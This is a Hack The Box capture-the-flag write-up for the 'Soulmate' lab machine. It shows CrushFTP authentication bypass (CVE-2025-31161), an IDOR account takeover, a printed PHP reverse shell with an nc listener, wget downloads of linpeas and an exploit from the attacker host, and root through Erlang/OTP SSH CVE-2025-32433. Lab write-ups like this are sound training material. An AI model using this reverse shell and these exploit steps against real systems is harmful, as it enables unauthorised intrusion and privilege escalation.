# Soulmate_htb_writeup-pt

---

# Deliverable1:
# My Profile:
## https://app.hackthebox.com/public/users/2064724
# The Active Machine:
## https://app.hackthebox.com/machines/Soulmate

# Deliverable2:
![Screenshot 2026-02-05 140218.png](image/solved.png)

---

# Deliverable3: Writeup

# Write up

   starting with connection with VPN network by given OpenVPN credential file and gain access to it locally , then start reconnaissance with given IP by Nmap scan. the Nmap scan shows there are  2 ports open **{SSH via 22 , HTTP via 80}** and URL for **HTTP** server **{ http://soulmate.htb/}** and basic details as the used IP OS Ubuntu .

![Screenshot 2026-02-01 141357.png](image/nmap.png)

 while i use local connection assuming the URL with target IP manually into **“/etc/hosts”** because the traffic wasn't resolved via DNS.

![image.png](image/etc-hosts.png)

   open the http website and try to scan it **manually** then by using **“burp suite”** but its have a so many website so go to scan it by tool as **“Go buster”**.  the result showed couple of pages and anther URL **{[ftp.soulmate.htb](http://ftp.soulmate.htb/)}** and this contain only login page so start with it. I haven't credential to try to capture any.

![image.png](image/gobaster.png)

   the HTTP header for **{[ftp.soulmate.htb](http://ftp.soulmate.htb/)}** contained **CrushFTP** version 11 and the date is 3/8/2025 the same date and version for the **{CVE-2025-31161}** . this vulnerability happens when the CrushFTP as file transfer server takes user request with Authorization via Cookies and aws as a request-signing authentication and its necessary for CrushFTP server to be compatible with other services from aws.

![image.png](image/burp.png)

 this CrushFTP vulnerability hade **multi-threaded race condition** first one validates the session/credentials as **"crushadmin"** so while crushadmin always exist in the data base and at the same time other one go to verified for signature and here were a **Time-of-check to time-of-use (TOCTOU) window** for waiting the second thread response so the attacker creates himself a temporary authenticated credential injected to login

![image.png](image/CVE-2025-31161.png)

 after login to that website and browsing its pages found **"Insecure Direct Object Reference (IDOR)"** to get any user access to shows other users and their settings. identified a user named ‘ben’ and had access for the **Source code directory** and we can change his password.

![image.png](image/changepass.png)

  after login to ben account we can upload and edit the web root and  uploaded attacker reverse shell written by PHP the we can access it by soulmate.htb and payload listener for the same port to establish a reverse connection to attacker machine. 

![image.png](image/shell.png)

![image.png](image/uplode.png)

I ran python to upgrade to an interactive TTY shell using Python's pty module and its **misconfiguration** while 'ben' showed as web service admin should not have been granted access for OS.

![image.png](image/nc.png)

![image.png](image/pty.png)

   The shell had sufficient permissions to use wget command , so I exploit that to transfer the [linpeas.sh](http://linpeas.sh/) script from my attacker machine. this script  **"Privilege Escalation Awesome Scripts SUITE"**  and discovered 4 applicable CVEs on privilege escalation vulnerabilities found in the system.

### Attacker machine

```bash
cd /usr/share/peass/linpeas
python3 -m http.server 8000
```

### from ben shell

```bash
wget [http://10.10.14.17:8000/linpeas.sh
|
|
|](http://10.10.14.17:8000/linpeas.sh)
[linpeas.sh](http://linpeas.sh/)          100%[===================>] 828.43K   463KB/s    in 1.8s
chmod +x [linpeas.sh](http://linpeas.sh/)
./linpeas.sh

```

![image.png](image/linpeas1.png)

### basic knowledge :OS and user privilege

![image.png](image/linpeas2.png)

![image.png](image/linpeas3.png)

![image.png](image/path.png)

  linpeas also showed some recently executed scripts and I test to reach it and i read the data from it successfully where i found cleartext SSH credentials for 'ben', and other SSH connect on 172.0.0.1:2222.

### find ps running script

![image.png](image/scriptpath.png)

```bash
cat /user/lib/erlang_login/start.escript
```

### find ssh credential from the script

![image.png](image/bensshpass.png)

![image.png](image/llpass.png)

After connecting the SSH I could read the data and interact with the operating system, here we find user flag. 

![image.png](image/sshconect.png)

Then I try to connect to local SSH but its not open full session. so i try to listen for it by **nc** the connection timed out quickly but its enough wile its return some date/service banner {SSH-2.0-Erlang/5.2.9}.

![image.png](image/nclocal.png)

after searching on this vulnerability i found CVE related for that {cve-2025-32433}.this CVE "affects the Erlang/OTP SSH implementation protocol version 5.2.9, which allows to an Erlang/OTP SSH server open Remote Code Execution for root without prior authentication. this SSH service was vulnerable to remote code execution as root , that allowed me to run OS command as os:cmd(" ") or from python script. and here i found the root flag.

### From Attacker machine

```bash
sudo git clone https://github.com/omer-efe-curkus/CVE-2025-32433-Erlang-OTP-SSH-RCE-PoC.git

┌─[sniper@spades]─[~/CVE-2025-31161/CVE-2025-32433-Erlang-OTP-SSH-RCE-PoC]
└──╼ $python3 -m http.server 8000
```

### from ben shell

```bash
wget [http://10.10.14.22:8000/cve-2025-32433.py
|
|
|](http://10.10.14.22:8000/cve-2025-32433.py)
[cve-2025-32433.py](http://cve-2025-32433.py/)          100%[=======================================>]   7.98K  --.-KB/s    in 0.002s
```

### check the vulnerability

![image.png](image/CVE-2025-32433.png)

## exploit the vulnerability

![image.png](image/CVE-2025-32433.2.png)

---

# PenTester notes

### enumeration

```bash
sudo nmap -p- -sC -sV -T4 10.129.231.23

		find :
				"ssh" on port 22 
				"http" on port 80 with URL
									http://soulmate.htb/ 
				os been 'Ubonto'
```

### assign URL with machine Ip

```bash
sudo nano /etc/hosts

		adding: 
				10.129.231.23            soulmate. htb
```

### scan the website manual then using gobuster

```bash
gobuster vhost -u [http://soulmate.htb](http://soulmate.htb/) -w /usr/share/wordlists/dirb/common.txt --append-domain -t 150

			important result:
						ftp.soulmate.htb
```

### assign FTP URL with machine Ip

```bash
sudo nano /etc/hosts

		adding: 
				10.129.231.23            ftp.soulmate. htb
```

### inspect by burp suet

HTTP traffic Burp Suite and find version 11.W.657 in the header  {CrushFTP vulnerable as CVE-2025-31161}

### search for  CVE-2025-311161

```bash
sudo git clone https://github.com/Immersive-Labs-Sec/CVE-2025-31161.git
cd CVE-2025-31161
sudo chmod +x [cve-2025-31161.py](http://cve-2025-31161.py/)
```

### run python script to generate my Attacker machine

```nasm
python3 cve-2025-31161.py --target_host ftp. soulmate.htb --port 80 --new_user weam --password wewe123
```

### login using this page

from page admin>user manager

ben account > generate new random password  

### login as ben

```nasm
<?php 
$sock = fsockopen($ip, $port);
$proc = proc_open("/bin/sh", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>
```

and wile ben has access for webserver I can upload my php shell file 

### starting the shell

```bash
nc -lvnp 9001
```

from browser open http://soulmate.htb/s.php 

### back to the listener

```nasm
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### from Attacker machine

```bash
cd /usr/share/peass/linpeas
python3 -m http.server 8000
```

### from ben shell

```bash
wget [http://10.10.14.17:8000/linpeas.sh
|
|
|](http://10.10.14.17:8000/linpeas.sh)
[linpeas.sh](http://linpeas.sh/)          100%[===================>] 828.43K   463KB/s    in 1.8s
chmod +x [linpeas.sh](http://linpeas.sh/)
./linpeas.sh

```

### this tool find couple CVEs in this shell/OS

![image.png](image/CVEs.png)

### Identify the vulnerability — weakness

- Vulnerabilities:
    - [ ]  FTP weakness: Identified the login/entry point was old version from CrushFTP v11, which had authentication bypass {CVE-2025-311161}
    - [ ]  Erlang/OTP SSH: Privilege Escalation Vulnerability by exploiting ssh protocol for massage handling, giant unauthorized assess which affected on OS {CVE-2025-32433}
    - [ ]  PwnKit  Weakness: Memory corruption / out-of-bounds read/write in polkit's pkexec (SUID-root binary present on almost all major distros){CVE-2021-4034}.
    - [ ]  sudo Baron Samedit : heap-based buffer overflow  in sudo Allows privilege escalation to root without password in many cases {CVE-2021-3156}.
    - [ ]  Netfilter heap out-of-bounds write  Weakness: exploitable via user namespaces lead to privilege escalation or DoS {CVE-2021-22555}.
    - [ ]  setuid screen 5.8.0 LPE  Weakness: Local privilege escalation in GNU screen Exploit often abuses tty handling or environment variables {CVE-2017-5618}.
- four of these vulnerabilities are classic local privilege escalation vulnerabilities and its have high impact if unpatched and i found it by scanning via “**linpeas”tool** after SSH login as ben
- CrushFTP discovered by inspect the traffic by “burp suite” from the [ftb.soulmate.htb](http://soulmate.htb/) while it use old version
    - this can be exploit by python script from GitHub or manually by post HTTP traffic
    - normally ats go to aws and cheach the credintial from if it found in crushftp and enjected insode Race Condition windows
- Erlang/OTP SSH **discovered by starting listener for it**
    - exploit by python script from GitHub while its work with root
    - injection shell command form python connection
    
    ---
    

### find logs file

![image.png](image/logs.png)

### find ps running script

![image.png](image/scriptpath.png)

```bash
cat /user/lib/erlang_login/start.escript
```

### find ssh credential from the script

![image.png](image/bensshpass.png)

![image.png](image/llpass.png)

## SSH connection

and here we find user password 

## other ssh

```bash
ssh ben@172.0.0.1 2222   //this not work
```

## listen on that

search for this vulnerability 

## CVE-2025-32433

### from my terminal

```bash
sudo git clone https://github.com/omer-efe-curkus/CVE-2025-32433-Erlang-OTP-SSH-RCE-PoC.git

┌─[sniper@spades]─[~/CVE-2025-31161/CVE-2025-32433-Erlang-OTP-SSH-RCE-PoC]
└──╼ $python3 -m http.server 8000
```

### from ben shell

```bash
wget [http://10.10.14.22:8000/cve-2025-32433.py
|
|
|](http://10.10.14.22:8000/cve-2025-32433.py)
[cve-2025-32433.py](http://cve-2025-32433.py/)          100%[=======================================>]   7.98K  --.-KB/s    in 0.002s
```

### check the vulnerability

## exploit the vulnerability

![image.png](image/CVE-2025-32433.2.png)
